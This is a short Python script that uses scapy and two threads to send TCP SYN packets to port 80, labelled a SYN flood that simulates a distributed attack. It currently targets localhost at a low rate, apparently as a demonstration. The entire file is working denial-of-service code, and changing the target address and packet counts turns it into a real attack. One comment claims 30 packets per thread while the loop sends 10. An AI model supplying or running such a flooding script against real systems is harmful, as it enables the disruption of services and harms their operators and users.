from scapy.all import IP, TCP, send
import threading
import time

# Target details
target_ip = "127.0.0.1"
target_port = 80
num_threads = 2  # Simulates a distributed attack

# Function to send SYN packets
def send_syn_flood():
    syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
    for _ in range(10):  # Each thread sends 30 packets
        send(syn_packet, verbose=True)
        time.sleep(0.5)  # Delay to control traffic rate

if __name__=="__main__":
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_syn_flood)
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    print("All threads finished.")